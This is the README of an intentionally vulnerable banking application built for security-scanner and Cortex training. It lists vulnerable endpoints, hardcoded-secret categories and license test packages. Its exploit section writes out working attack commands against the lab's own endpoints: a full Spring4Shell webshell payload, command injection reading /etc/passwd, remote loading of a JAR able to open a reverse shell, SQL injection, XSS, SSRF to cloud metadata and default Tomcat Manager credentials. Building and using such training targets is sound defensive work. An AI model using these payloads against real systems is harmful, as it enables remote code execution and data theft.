![GoCortex Broken Bank Logo](static/images/brokenbank-logo.png)

# GoCortex Broken Bank

## Overview

GoCortex Broken Bank is an intentionally vulnerable application designed specifically to support Palo Alto Networks Cortex Cloud + Palo Alto Networks Cortex XSIAM/XDR training. This application serves as a comprehensive testing ground for CI/CD security validation pipelines, featuring a wide range of deliberately implemented security vulnerabilities that mirror real-world common misconfigurations ready for assessment and exploitation.

![GoCortex Broken Bank Application](static/images/app-screenshot.png)

## Dual-Server Architecture

The application is split into two servers: a Flask service for SAST-style findings and a Tomcat service for realistic Java RCE testing.

### Flask/Gunicorn Server (Port 8888)
- **Purpose**: SAST (Static Application Security Testing) endpoints
- **Technology**: Python 3.11, Flask 2.0.1, Gunicorn 20.1.0
- **Coverage**: 42 vulnerability endpoints including SQL injection, XSS, SSRF, weak cryptography
- **Testing Focus**: Code-level vulnerabilities, secrets detection, license compliance

### Tomcat Server (Port 9999)
- **Purpose**: Exploit endpoints for penetration testing and RCE validation
- **Technology**: Apache Tomcat 8.5.0, OpenJDK 17, Spring Framework 5.3.0
- **Coverage**: 6 critical RCE endpoints including Spring4Shell (CVE-2022-22965)
- **Testing Focus**: Enterprise Java exploitation scenarios commonly targeted by DAST and RCE detection engines

**Why Dual-Server Architecture?**

Security scanners and penetration testing tools treat Tomcat differently from lightweight Python servers. By hosting exploit endpoints on Tomcat:
- Improves detection rates in tools that treat Tomcat-based applications differently from lightweight Python services
- Realistic Java/Spring vulnerability testing
- Improved scanner recognition of critical RCE endpoints
- Better alignment with real-world enterprise application stacks

## Purpose

This application is purpose-built for:
- **Cortex Cloud Application Security Testing** - Validate your Cortex Cloud security policies
- **CI/CD Pipeline Integration** - Test automated security scanning in DevSecOps workflows
- **Security Tool Benchmarking** - Sanity-check what different SAST and DAST tools actually flag in practice
- **Educational Training** - Learn about common application security vulnerabilities in a controlled environment

## Security Vulnerabilities

This application contains **intentionally vulnerable code** implementing multiple security flaws including:

### Flask/Gunicorn Vulnerability Endpoints (42 Endpoints - Port 8888)

**Endpoint Exploitability Guide**: For detailed information about which Flask endpoints are truly exploitable versus simulation-only, see **[ENDPOINTS_EXPLOITABILITY.md](docs/ENDPOINTS_EXPLOITABILITY.md)** which categorises all 42 endpoints by their actual exploitability level:
- **24 Truly Exploitable** - Endpoints that genuinely execute vulnerable code, rather than returning static or simulated results
- **6 Partially Exploitable** - Execute code with limitations or simulated behaviour  
- **12 Simulation Only** - Return configuration strings for SAST scanner detection

| Vulnerability Type | Endpoint | Description | Checkov Policy IDs |
|-------------------|----------|-------------|-------------------|
| **SQL Injection** | `/search` | Database query injection | CKV3_SAST_51 |
| **Cross-Site Scripting** | `/comment` | XSS with unescaped output | CKV3_SAST_89 |
| **LDAP Injection** | `/ldap` | Directory service injection | CKV3_SAST_61 |
| **Insecure Deserialisation** | `/deserialize` | Pickle vulnerability | CKV3_SAST_58 |
| **Server-Side Request Forgery** | `/fetch` | SSRF with disabled SSL verification | CKV3_SAST_189, CKV3_SAST_186 |
| **XML External Entity** | `/xml` | XXE parser vulnerability | CKV3_SAST_50, CKV3_SAST_90 |
| **HTTP Header Injection** | `/redirect` | Response header manipulation | CKV3_SAST_88 |
| **Weak SSL/TLS Configuration** | `/ssl_test` | Inadequate transport security | CKV3_SAST_65, CKV3_SAST_67 |
| **Weak Cryptography** | `/hash` | MD5 hashing without salt | CKV3_SAST_55, CKV3_SAST_72 |
| **Weak AES Encryption** | `/encrypt` | Static IV and weak modes | CKV3_SAST_68, CKV3_SAST_59 |
| **Unauthenticated Key Exchange** | `/keyexchange` | Key exchange without authentication | CKV3_SAST_98, CKV3_SAST_10 |
| **Path Traversal** | `/file` | Directory traversal attack | CKV3_SAST_86, CKV3_SAST_173, CKV3_SAST_169 |
| **Wildcard Injection** | `/wildcard` | User-controlled glob patterns | CKV3_SAST_170 |
| **NoSQL Injection** | `/mongo` | MongoDB query injection | CKV3_SAST_52 |
| **Weak Database Authentication** | `/database` | Hardcoded credentials | CKV3_SAST_71 |
| **JWT Without Verification** | `/token` | Unsigned JWT processing | CKV3_SAST_54 |
| **Improper Access Control** | `/admin` | Weak authorisation | CKV3_SAST_97 |
| **JSON Code Injection** | `/json` | Eval-based JSON parsing | CKV3_SAST_82 |
| **Information Disclosure** | `/debug` | Application config exposure | CKV3_SAST_96 |
| **Insecure Logging** | `/log` | User input in logs | CKV3_SAST_62, CKV3_SAST_57 |
| **Template Injection** | `/template` | Disabled autoescape | CKV3_SAST_60, CKV3_SAST_175 |
| **Improper Exception Handling** | `/exception` | Silent failures | CKV3_SAST_4 |
| **Weak Random Generation** | `/random` | Predictable values | CKV3_SAST_167 |
| **None Attribute Access** | `/none` | Null pointer access | CKV3_SAST_73 |
| **CSRF Protection Disabled** | `/transfer` | Money transfer without CSRF protection | CKV3_SAST_56 |
| **Cleartext Credential Transmission** | `/credentials` | Credentials sent in cleartext | CKV3_SAST_93 |
| **ML Model Download Without Integrity** | `/ml_model` | Model download without hash verification | CKV3_SAST_99 |
| **PyTorch Missing Hash Check** | `/pytorch` | PyTorch model loading vulnerability | CKV3_SAST_194 |
| **Redis Configuration Without SSL** | `/redis` | Unencrypted Redis connections | CKV3_SAST_187 |
| **Improper Pathname Limitation** | `/download` | File download path manipulation | CKV3_SAST_169 |
| **HTML Tag Neutralisation Failure** | `/html` | Unescaped HTML output | CKV3_SAST_175 |
| **Uncontrolled Resource Consumption** | `/resource` | Memory exhaustion vulnerability | CKV3_SAST_91 |
| **Configuration Input Code Injection** | `/config` | Config parameter execution | CKV3_SAST_168 |
| **Custom URL Scheme Authorisation** | `/custom_scheme` | Improper scheme handling | CKV3_SAST_70 |
| **LDAP Anonymous Binding** | `/ldap_anon` | Anonymous LDAP authentication | CKV3_SAST_66 |
| **File Permission Vulnerabilities** | `/permissions` | World-readable/writable files | CKV3_SAST_69 |
| **Insecure IPMI Configuration** | `/ipmi` | Hardware management vulnerabilities | CKV3_SAST_37 |
| **Cleartext Email Transmission** | `/email` | Unencrypted SMTP | CKV3_SAST_63 |
| **TensorFlow Model Security** | `/tensorflow` | Insecure model loading | CKV3_SAST_194 |
| **Resource Exhaustion** | `/exhaust` | Memory exhaustion attacks | CKV3_SAST_91 |

### Java/Tomcat Exploit Endpoints (Tomcat 8.5.0 - Port 9999)

| Vulnerability Type | Endpoint | Description | Technology | CVE References |
|-------------------|----------|-------------|------------|---------------|
| **Unrestricted File Upload** | `/exploit-app/upload` | JSP webshell deployment allowing arbitrary code execution | Servlet API 4.0.1 | N/A (Common OWASP A03) |
| **Command Injection (Runtime.exec)** | `/exploit-app/execute` | OS command execution via Runtime.exec() without input validation | Java Runtime API | CWE-78 |
| **Command Injection (ProcessBuilder)** | `/exploit-app/ping` | Shell-based command injection through ProcessBuilder | Java ProcessBuilder | CWE-78 |
| **Dynamic Class Loading** | `/exploit-app/dynamic` | Arbitrary code execution via URLClassLoader from remote JAR files | Java URLClassLoader | CWE-470 |
| **Script Engine Evaluation** | `/exploit-app/eval` | JavaScript/Groovy code execution through ScriptEngine API | Nashorn, Groovy | CWE-95 |
| **Spring4Shell RCE** | `/exploit-app/spring4shell` | Class loader manipulation for JSP webshell deployment | Spring Framework 5.3.0 | **CVE-2022-22965** |

### Tomcat 8.5.0 Known Vulnerabilities

| CVE ID | CVSS Score | Vulnerability Type | Description |
|--------|------------|-------------------|-------------|
| **CVE-2020-1938** | 9.8 CRITICAL | Ghostcat AJP Connector | Arbitrary file read and RCE via AJP protocol |
| **CVE-2020-9484** | 7.0 HIGH | Deserialization RCE | Remote code execution via session deserialization |
| **CVE-2021-25122** | 7.5 HIGH | Request Smuggling | HTTP request smuggling vulnerability |
| **CVE-2023-42795** | 5.3 MEDIUM | Information Disclosure | Incomplete cleanup of recycled objects |
| **CVE-2023-45648** | 5.3 MEDIUM | Request Smuggling | Additional HTTP request smuggling variant |

### Spring4Shell (CVE-2022-22965) - Critical RCE

**CVSS Score**: 9.8 (Critical)  
**Affected Version**: Spring Framework 5.3.0  
**Requirements for Exploitation**:
- JDK 9 or higher (OpenJDK 17 in this application)
- Apache Tomcat as servlet container
- WAR deployment (not Spring Boot executable JAR)
- Spring MVC with form parameter binding

**Technical Details:**

Spring4Shell exploits data binding functionality to access the `class.module.classLoader` object (introduced in JDK 9). Attackers can manipulate Tomcat's AccessLogValve properties to write JSP webshells into the application root directory.

**Exploitation Flow:**
1. Send crafted HTTP request with special parameters targeting class loader
2. Modify Tomcat's AccessLogValve configuration via Spring data binding
3. Configure valve to write JSP content to Tomcat's webapps directory
4. Trigger webshell creation through subsequent request
5. Access webshell for arbitrary command execution

**Exploit Parameters:**
```
class.module.classLoader.resources.context.parent.pipeline.first.pattern
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
```

### Hardcoded Secrets for Scanner Validation (75+ values)

| Secret Type | Description | Checkov Policy IDs | Count |
|-------------|-------------|-------------------|-------|
| **AWS Access Keys** | Multiple hardcoded AWS credentials | CKV_SECRET_2, CKV_SECRET_1 | 5+ |
| **OpenAI API Keys** | GPT API tokens | CKV_SECRET_107 | 3+ |
| **Database Credentials** | Hardcoded database passwords | CKV3_SAST_71 | 8+ |
| **GitHub Tokens** | Repository access tokens | CKV_SECRET_43 | 4+ |
| **Stripe API Keys** | Payment processing secrets | CKV_SECRET_17 | 3+ |
| **Slack Tokens** | Workspace and bot tokens | CKV_SECRET_14 | 4+ |
| **Twitter API Keys** | Social media authentication | CKV_SECRET_20 | 3+ |
| **Google API Keys** | Cloud services credentials | CKV_SECRET_6 | 5+ |
| **Azure Credentials** | Microsoft cloud authentication | CKV_SECRET_3 | 4+ |
| **JWT Secrets** | Token signing keys | CKV_SECRET_45 | 6+ |
| **Discord Tokens** | Bot and application tokens | CKV_SECRET_41 | 3+ |
| **PayPal Credentials** | Payment gateway secrets | CKV_SECRET_18 | 2+ |
| **Dropbox Tokens** | File storage API keys | CKV_SECRET_39 | 3+ |
| **Twilio Credentials** | SMS and communication APIs | CKV_SECRET_22 | 4+ |
| **Mailgun Keys** | Email service authentication | CKV_SECRET_26 | 2+ |
| **Redis Passwords** | Database connection strings | CKV_SECRET_31 | 3+ |
| **MongoDB Credentials** | NoSQL database authentication | CKV_SECRET_32 | 4+ |
| **Docker Hub Tokens** | Container registry access | CKV_SECRET_48 | 2+ |
| **SSH Private Keys** | Server access credentials | CKV_SECRET_50 | 3+ |
| **Additional API Keys** | Various service credentials | Multiple policies | 15+ |

### License Compliance Testing (PyGremlinBox Integration)

GoCortex Broken Bank integrates **71 PyGremlinBox packages** (65 varied license packages + 6 malware simulation packages) by Simon Sigre for comprehensive license compliance and malware simulation testing:

| License Type | Package | Policy Risk Level | SCA Detection Trigger |
|-------------|---------|-------------------|----------------------|
| **AGPL 1.0** | `pygremlinbox-agpl-1-0` | CRITICAL | Affero GPL v1 network copyleft obligations |
| **AGPL 1.0 Only** | `pygremlinbox-agpl-1-0-only` | CRITICAL | AGPL v1 exact version restriction |
| **AGPL 1.0 or Later** | `pygremlinbox-agpl-1-0-or-later` | CRITICAL | AGPL v1+ version flexibility clause |
| **AGPL 3.0** | `pygremlinbox-agpl-3-0` | CRITICAL | Affero GPL v3 network copyleft obligations |
| **AGPL 3.0 Only** | `pygremlinbox-agpl-3-0-only` | CRITICAL | AGPL v3 exact version restriction |
| **AGPL 3.0 or Later** | `pygremlinbox-agpl-3-0-or-later` | CRITICAL | AGPL v3+ version flexibility clause |
| **APSL** | `pygremlinbox-apsl` | MEDIUM | Apple Public Source License restrictions |
| **Arphic 1999** | `pygremlinbox-arphic-1999` | MEDIUM | Arphic Public License font restrictions |
| **Artistic 1.0** | `pygremlinbox-artistic-1-0` | MEDIUM | Perl Artistic License obligations |
| **BUSL 1.1** | `pygremlinbox-busl-1-1` | HIGH | Business Source License time-delayed open source |
| **C-UDA 1.0** | `pygremlinbox-c-uda-1-0` | MEDIUM | C User Data Agreement license |
| **CAL 1.0 Combined Work Exception** | `pygremlinbox-cal-1-0-combined-work-exception` | HIGH | Cryptographic Autonomy License exceptions |
| **CC BY-NC 3.0 DE** | `pygremlinbox-cc-by-nc-3-0-de` | HIGH | Creative Commons NonCommercial Germany |
| **CC BY-NC-ND 3.0 DE** | `pygremlinbox-cc-by-nc-nd-3-0-de` | HIGH | Creative Commons NonCommercial NoDerivatives Germany |
| **CC BY-NC-ND 3.0 IGO** | `pygremlinbox-cc-by-nc-nd-3-0-igo` | HIGH | Creative Commons NonCommercial NoDerivatives IGO |
| **CC BY-NC-SA 2.0 DE** | `pygremlinbox-cc-by-nc-sa-2-0-de` | HIGH | Creative Commons NonCommercial ShareAlike Germany v2 |
| **CC BY-NC-SA 2.0 FR** | `pygremlinbox-cc-by-nc-sa-2-0-fr` | HIGH | Creative Commons NonCommercial ShareAlike France |
| **CC BY-NC-SA 2.0 UK** | `pygremlinbox-cc-by-nc-sa-2-0-uk` | HIGH | Creative Commons NonCommercial ShareAlike UK |
| **CC BY-NC-SA 3.0 DE** | `pygremlinbox-cc-by-nc-sa-3-0-de` | HIGH | Creative Commons NonCommercial ShareAlike Germany v3 |
| **CC BY-NC-SA 3.0 IGO** | `pygremlinbox-cc-by-nc-sa-3-0-igo` | HIGH | Creative Commons NonCommercial ShareAlike IGO |
| **CC BY-ND 3.0 DE** | `pygremlinbox-cc-by-nd-3-0-de` | MEDIUM | Creative Commons NoDerivatives Germany |
| **CC BY-SA 2.0 UK** | `pygremlinbox-cc-by-sa-2-0-uk` | HIGH | Creative Commons ShareAlike UK v2 |
| **CC BY-SA 2.1 JP** | `pygremlinbox-cc-by-sa-2-1-jp` | HIGH | Creative Commons ShareAlike Japan |
| **CC BY-SA 3.0 AT** | `pygremlinbox-cc-by-sa-3-0-at` | HIGH | Creative Commons ShareAlike Austria |
| **CC BY-SA 3.0 DE** | `pygremlinbox-cc-by-sa-3-0-de` | HIGH | Creative Commons ShareAlike Germany v3 |
| **CC BY-SA 4.0** | `pygremlinbox-cc-by-sa-4-0` | HIGH | Creative Commons ShareAlike International |
| **CDDL 1.0** | `pygremlinbox-cddl-1-0` | HIGH | Common Development Distribution License |
| **CDLA Sharing 1.0** | `pygremlinbox-cdla-sharing-1-0` | HIGH | Community Data License Agreement |
| **CERN OHL S 2.0** | `pygremlinbox-cern-ohl-s-2-0` | HIGH | CERN Open Hardware License Strongly Reciprocal |
| **CERN OHL W 2.0** | `pygremlinbox-cern-ohl-w-2-0` | MEDIUM | CERN Open Hardware License Weakly Reciprocal |
| **Copyleft Next 0.3.0** | `pygremlinbox-copyleft-next-0-3-0` | HIGH | Next-generation copyleft license |
| **Copyleft Next 0.3.1** | `pygremlinbox-copyleft-next-0-3-1` | HIGH | Next-generation copyleft license v0.3.1 |
| **CPOL 1.02** | `pygremlinbox-cpol-1-02` | MEDIUM | Code Project Open License |
| **eCos 2.0** | `pygremlinbox-ecos-2-0` | HIGH | eCos License version 2.0 |
| **EPL 1.0** | `pygremlinbox-epl-1-0` | MEDIUM | Eclipse Public License v1 restrictions |
| **EPL 2.0** | `pygremlinbox-epl-2-0` | MEDIUM | Eclipse Public License v2 restrictions |
| **EUPL 1.1** | `pygremlinbox-eupl-1-1` | MEDIUM | European Union Public License v1.1 |
| **EUPL 1.2** | `pygremlinbox-eupl-1-2` | MEDIUM | European Union Public License v1.2 |
| **EUPL 3.0** | `pygremlinbox-eupl-3-0` | MEDIUM | European Union Public License v3.0 |
| **FDK AAC** | `pygremlinbox-fdk-aac` | HIGH | Fraunhofer FDK AAC Codec License |
| **GPL 2.0** | `pygremlinbox-gpl-2-0` | CRITICAL | GNU General Public License v2 |
| **GPL 3.0** | `pygremlinbox-gpl-3-0` | CRITICAL | Strong copyleft license obligations |
| **Hippocratic 2.1** | `pygremlinbox-hippocratic-2-1` | HIGH | Ethical use restrictions and compliance |
| **JPL Image** | `pygremlinbox-jpl-image` | MEDIUM | Jet Propulsion Laboratory Image Use Policy |
| **LGPL 2.0** | `pygremlinbox-lgpl-2-0` | HIGH | Legacy LGPL v2 copyleft requirements |
| **LGPL 2.1** | `pygremlinbox-lgpl-2-1` | HIGH | Legacy LGPL v2.1 copyleft requirements |
| **LGPL 3.0** | `pygremlinbox-lgpl-3-0` | HIGH | Lesser GNU GPL copyleft obligations |
| **Linux Man Pages Copyleft** | `pygremlinbox-linux-man-pages-copyleft` | MEDIUM | Linux documentation license |
| **MPL 1.1** | `pygremlinbox-mpl-1-1` | MEDIUM | Mozilla Public License v1.1 copyleft |
| **MPL 2.0** | `pygremlinbox-mpl-2-0` | MEDIUM | Mozilla Public License v2 copyleft |
| **MS-LPL** | `pygremlinbox-ms-lpl` | MEDIUM | Microsoft Limited Public License |
| **NCGL UK 2.0** | `pygremlinbox-ncgl-uk-2-0` | HIGH | Non-Commercial Government License UK |
| **OpenPBS 2.3** | `pygremlinbox-openpbs-2-3` | MEDIUM | OpenPBS Software License |
| **OSL 3.0** | `pygremlinbox-osl-3-0` | HIGH | Open Software License restrictions |
| **PolyForm NC 1.0.0** | `pygremlinbox-polyform-noncommercial-1-0-0` | HIGH | PolyForm Noncommercial restrictions |
| **PolyForm Small Business 1.0.0** | `pygremlinbox-polyform-small-business-1-0-0` | HIGH | PolyForm Small Business License |
| **QPL 1.0 INRIA 2004** | `pygremlinbox-qpl-1-0-inria-2004` | MEDIUM | Q Public License INRIA variant |
| **Sendmail 8.23** | `pygremlinbox-sendmail-8-23` | MEDIUM | Sendmail License |
| **SIMPL 2.0** | `pygremlinbox-simpl-2-0` | HIGH | Simple Public License |
| **SSPL 1.0** | `pygremlinbox-sspl-1-0` | CRITICAL | Server Side Public License MongoDB |
| **TAPR OHL 1.0** | `pygremlinbox-tapr-ohl-1-0` | HIGH | TAPR Open Hardware License |
| **TPL 1.0** | `pygremlinbox-tpl-1-0` | MEDIUM | THOR Public License |
| **UCL 1.0** | `pygremlinbox-ucl-1-0` | MEDIUM | Upstream Compatibility License |
| **Unlicense** | `pygremlinbox-unlicense` | PUBLIC DOMAIN | Public domain dedication policies |
| **wxWindows** | `pygremlinbox-wxwindows` | MEDIUM | wxWindows Library License |

#### Malware Simulation Package Collection (6 Packages)

| Simulation Type | Package | Detection Category | Security Testing Purpose |
|-----------------|---------|-------------------|-------------------------|
| **Network Indicators** | `pygremlinbox-malware-network-indicators` | MALWARE | Network-based threat detection patterns |
| **C2 Beacon** | `pygremlinbox-malware-c2-beacon` | MALWARE | Command and control communication signatures |
| **Code Obfuscation** | `pygremlinbox-malware-code-obfuscation` | MALWARE | Obfuscated code detection techniques |
| **Install Execution** | `pygremlinbox-malware-install-execution` | MALWARE | Malware installation and execution patterns |
| **Credential Harvesting** | `pygremlinbox-malware-credential-harvesting` | MALWARE | Credential theft detection signatures |
| **Cryptomining Indicators** | `pygremlinbox-malware-cryptomining-indicators` | MALWARE | Cryptomining activity detection patterns |

**Enhanced License Testing Features:**
- **65 Diverse License Types** for comprehensive SCA policy coverage
- **Commercial Use Restrictions** triggering compliance alerts  
- **Copyleft Obligations** requiring source code disclosure
- **Network Copyleft Clauses** (AGPL, SSPL) for SaaS applications
- **Ethical Use Licenses** (Hippocratic) with moral restrictions
- **Time-Delayed Open Source** (Business Source License) complexities
- **Multi-Jurisdictional Coverage** (Germany, UK, EU, France, Japan, Austria variants)
- **Business Model Restrictions** (PolyForm Noncommercial, Small Business)
- **Hardware Licenses** (CERN OHL, TAPR OHL) for embedded systems
- **Version-Specific Restrictions** (AGPL 1.0 Only, 3.0 Only, or-later clauses)
- **Creative Commons Variants** (NonCommercial, NoDerivatives, ShareAlike combinations)
- Conflicting license compatibility matrices for policy validation
- These packages are embedded within normal dependency chains so SCA tools must identify them under realistic conditions

### Security Testing URLs (Fictitious Threat Domains)

The application includes **5 fictitious threat domains** embedded throughout the codebase for automated security scanner validation:

| Test Domain | Purpose | Location |
|-------------|---------|----------|
| **https://urlfiltering.paloaltonetworks.com/test-malware** | Official Palo Alto Networks test endpoint for malware filtering validation | app.py, config.py, secrets.py |
| **malware.sigre.xyz** | Simulated malware domain for security testing purposes | app.py, config.py, secrets.py |
| **hacker.sigre.xyz** | Test hacker domain for security validation | config.py, secrets.py, config/localise.yaml |
| **c2.sigre.xyz** | Command and control test domain | app.py, config.py, secrets.py |
| **botnet.sigre.xyz** | Botnet simulation domain for cybersecurity testing | app.py, config.py, secrets.py |

**Important:** These domains are entirely fictitious and used solely for validating URL filtering and threat detection capabilities. They are embedded within:
- Application source code for comprehensive testing coverage
- Configuration files for security scanner validation
- Secret management files for realistic threat simulation
- Test configuration files for systematic validation

## Exploit The Bank

### Tomcat Exploit Endpoints - Remote Code Execution (Port 9999)

The following CURL commands demonstrate exploitation of Java/Tomcat endpoints for comprehensive penetration testing:

| Vulnerability Type | Endpoint | CURL Command Example | Attack Purpose |
|-------------------|----------|---------------------|-------------|
| **JSP Webshell Upload** | `/exploit-app/upload` | `curl -F "file=@shell.jsp" "http://localhost:9999/exploit-app/upload"` | Upload JSP webshell for persistent remote code execution |
| **Runtime.exec() Command Injection** | `/exploit-app/execute` | `curl "http://localhost:9999/exploit-app/execute?cmd=whoami"` | Direct OS command execution via Java Runtime API |
| **ProcessBuilder Command Injection** | `/exploit-app/ping` | `curl "http://localhost:9999/exploit-app/ping?target=127.0.0.1%3B%20cat%20/etc/passwd"` | Shell command injection through ProcessBuilder |
| **Remote JAR Class Loading** | `/exploit-app/dynamic` | `curl "http://localhost:9999/exploit-app/dynamic?url=https://raw.githubusercontent.com/YOUR_USERNAME/broken-bank/main/vulnerable_data/payloads/evil.jar&class=com.gocortex.payload.RCEPayload&method=execute"` | Load and execute arbitrary classes from remote sources (replace YOUR_USERNAME with your GitHub username) |
| **JavaScript Code Evaluation** | `/exploit-app/eval` | `curl "http://localhost:9999/exploit-app/eval?code=java.lang.Runtime.getRuntime().exec('id')&engine=JavaScript"` | Execute JavaScript code with Java interop capabilities |
| **Spring4Shell Exploitation** | `/exploit-app/spring4shell` | See Spring4Shell section below for multi-step exploitation | CVE-2022-22965 RCE via class loader manipulation |

### Spring4Shell (CVE-2022-22965) Exploitation

**Step 1: Deploy JSP Webshell via AccessLogValve Manipulation**

```bash
curl 'http://localhost:9999/exploit-app/spring4shell?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&name=test' \
  -H 'suffix: %>//' \
  -H 'c1: Runtime' \
  -H 'c2: <%'
```

**Explanation:** This exploit manipulates Spring's parameter binding to access Tomcat's AccessLogValve object. The `%{c1}i`, `%{c2}i`, and `%{suffix}i` placeholders in the pattern are replaced by HTTP header values (`c1: Runtime`, `c2: <%`, `suffix: %>//`), causing Tomcat to write a JSP webshell to `webapps/ROOT/shell.jsp`.

**Step 2: Execute Commands via Webshell**

```bash
curl 'http://localhost:9999/shell.jsp?pwd=j&cmd=whoami'
curl 'http://localhost:9999/shell.jsp?pwd=j&cmd=id'
curl 'http://localhost:9999/shell.jsp?pwd=j&cmd=cat /etc/passwd'
```

### Remote JAR Class Loading Payload (evil.jar)

The repository includes a pre-built malicious JAR payload (`vulnerable_data/payloads/evil.jar`) for testing the `/exploit-app/dynamic` endpoint. This payload is automatically compiled during Docker build and can be hosted via GitHub for remote exploitation testing.

**Payload Capabilities:**
- **Command Execution:** Execute arbitrary OS commands via `executeCommand(String cmd)` method
- **Reverse Shell:** Establish reverse connections via `reverseShell(String host, int port)` method
- **Constructor Execution:** Automatic code execution on class instantiation

**Testing with evil.jar:**

```bash
# Option 1: Reference via GitHub (after pushing to your repository)
curl "http://localhost:9999/exploit-app/dynamic?url=https://raw.githubusercontent.com/YOUR_USERNAME/broken-bank/main/vulnerable_data/payloads/evil.jar&class=com.gocortex.payload.RCEPayload&method=execute"

# Option 2: Host locally and reference via HTTP server
cd vulnerable_data/payloads
python3 -m http.server 8000 &
curl "http://localhost:9999/exploit-app/dynamic?url=http://localhost:8000/evil.jar&class=com.gocortex.payload.RCEPayload&method=execute"

# Option 3: Execute custom command
curl "http://localhost:9999/exploit-app/dynamic?url=https://raw.githubusercontent.com/YOUR_USERNAME/broken-bank/main/vulnerable_data/payloads/evil.jar&class=com.gocortex.payload.RCEPayload&method=executeCommand&args=id"
```

**Source Code:** The payload source is available at `vulnerable_data/payloads/src/com/gocortex/payload/RCEPayload.java` and can be customised for specific testing scenarios.

### Exploit Application WAR File

The GoCortex Broken Bank Tomcat exploit endpoints are packaged as a deployable WAR (Web Application Archive) file for flexible deployment and testing scenarios.

**WAR File Location:**
```
./exploit-app/target/exploit-app.war
```

**WAR File Contents:**

The `exploit-app.war` archive contains all 6 intentionally vulnerable Java servlets and supporting infrastructure:

| Component | Description |
|-----------|-------------|
| **UploadServlet** | Unrestricted file upload for JSP webshell deployment (OWASP A03) |
| **ExecuteServlet** | OS command injection via Runtime.exec() without validation (CWE-78) |
| **PingServlet** | Shell-based command injection through ProcessBuilder (CWE-78) |
| **DynamicServlet** | Arbitrary code execution via URLClassLoader from remote JAR files (CWE-470) |
| **EvalServlet** | JavaScript/Groovy code execution through ScriptEngine API (CWE-95) |
| **Spring4ShellController** | CVE-2022-22965 RCE via class loader manipulation |
| **index.jsp** | Exploit endpoint directory listing and documentation |
| **web.xml** | Servlet mappings and intentionally weak security constraints |
| **servlet-locale.properties** | Internationalisation support for multi-language testing |

**Building the WAR File:**

```bash
# Navigate to exploit-app directory
cd exploit-app

# Clean and build the WAR file using Maven
mvn clean package

# WAR file generated at: ./target/exploit-app.war
```

**WAR File Uses:**

1. **Standard Deployment to Tomcat:**
   ```bash
   # Copy WAR to Tomcat webapps directory
   cp exploit-app/target/exploit-app.war /path/to/tomcat/webapps/
   
   # Tomcat auto-deploys the application to /exploit-app context
   # Access at: http://localhost:9999/exploit-app/
   ```

2. **Manual Deployment via Tomcat Manager:**
   ```bash
   # Deploy using Manager Script API
   curl -u admin:admin -T exploit-app/target/exploit-app.war \
     http://localhost:9999/manager/text/deploy?path=/exploit-app
   
   # Verify deployment
   curl -u admin:admin http://localhost:9999/manager/text/list
   ```

3. **Docker Container Deployment:**
   ```bash
   # WAR file is automatically deployed in Docker build
   # See Dockerfile: COPY exploit-app/target/exploit-app.war
   ```

4. **Standalone Tomcat Testing:**
   ```bash
   # Download and extract Tomcat 8.5.0
   wget https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.0/bin/apache-tomcat-8.5.0.tar.gz
   tar -xzf apache-tomcat-8.5.0.tar.gz
   
   # Deploy the WAR file
   cp exploit-app/target/exploit-app.war apache-tomcat-8.5.0/webapps/
   
   # Start Tomcat
   apache-tomcat-8.5.0/bin/catalina.sh run
   ```

**WAR File Size and Dependencies:**

The WAR file includes all necessary dependencies:
- Spring Framework 5.3.0 (for Spring4Shell vulnerability)
- Servlet API 4.0.1
- Groovy ScriptEngine (for eval endpoint)
- Nashorn JavaScript engine (JDK 17 built-in)

**Security Testing Applications:**

- **Penetration Testing**: Deploy to test environments for hands-on RCE exploitation practice
- **Security Scanner Validation**: Test DAST/IAST tools against vulnerable Tomcat deployments
- **CVE Detection**: Validate scanner capabilities for detecting Spring4Shell (CVE-2022-22965)
- **WAR Analysis**: Test SCA tools for identifying vulnerable dependencies within WAR archives
- **Deployment Security**: Assess Tomcat Manager access controls and deployment mechanisms

**Important:** This WAR file contains **intentionally vulnerable code** and must **NEVER** be deployed to production Tomcat servers or environments accessible by unauthorised users.

### Tomcat Manager Application Access

The Tomcat Manager application is configured with intentionally weak credentials for comprehensive testing:

| Username | Password | Roles | Access Level |
|----------|----------|-------|-------------|
| `admin` | `admin` | manager-gui, manager-script, admin-gui | Full administrative access |
| `tomcat` | `tomcat` | manager-gui, manager-script | Application deployment |
| `manager` | `manager` | manager-gui, manager-script, manager-jmx | Management console access |

**Manager Application Exploitation:**

```bash
# Access Manager GUI (requires credentials)
curl -u admin:admin http://localhost:9999/manager/html

# Deploy malicious WAR file via Manager Script
curl -u admin:admin -T malicious.war http://localhost:9999/manager/text/deploy?path=/malicious

# List deployed applications
curl -u admin:admin http://localhost:9999/manager/text/list
```

### Flask SAST Vulnerability Examples (Port 8888)

**Note:** Remote code execution endpoints (file upload, command execution) have been migrated to Tomcat (port 9999) for enhanced security scanner detection. Flask now focuses on SAST vulnerabilities, secrets detection, and license compliance testing.

The following CURL commands demonstrate Flask SAST vulnerabilities for security testing:

| Vulnerability Type | Endpoint | CURL Command Example | Attack Purpose |
|-------------------|----------|---------------------|-------------|
| **SQL Injection** | `/search` | `curl "http://localhost:8888/search?q=' OR '1'='1"` | Demonstrates SQL injection allowing unauthorised database access |
| **Cross-Site Scripting (XSS)** | `/comment` | `curl "http://localhost:8888/comment?comment=<script>alert(document.cookie)</script>"` | Stored XSS vulnerability allowing JavaScript injection |
| **SSRF (Server-Side Request Forgery)** | `/fetch` | `curl "http://localhost:8888/fetch?url=http://169.254.169.254/latest/meta-data/"` | SSRF attack against cloud metadata endpoints |
